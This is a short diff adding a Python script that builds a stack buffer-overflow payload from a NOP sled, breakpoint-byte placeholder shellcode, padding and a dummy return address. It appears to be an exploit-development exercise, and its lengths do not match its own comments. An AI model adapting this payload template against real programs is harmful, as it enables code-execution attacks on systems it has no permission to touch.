@@ -1,0 +1,15 @@
+#!/usr/bin/python
+
+# BUFER = 72
+# SHELLCODE = 55
+# NOP = 72 - 55 = 17 bytes
+# Return address = 6 bytes
+# RIP 0x7ffff7e200f5
+# NOP = 0x90
+
+nopsled = b"\x90" * 100
+buf = b"\xcc" * 55
+pad = b"X" * (72 - 17 - len(buf))
+rip = b"ABCDEFGH"
+
+print (nopsled + buf + pad + rip)
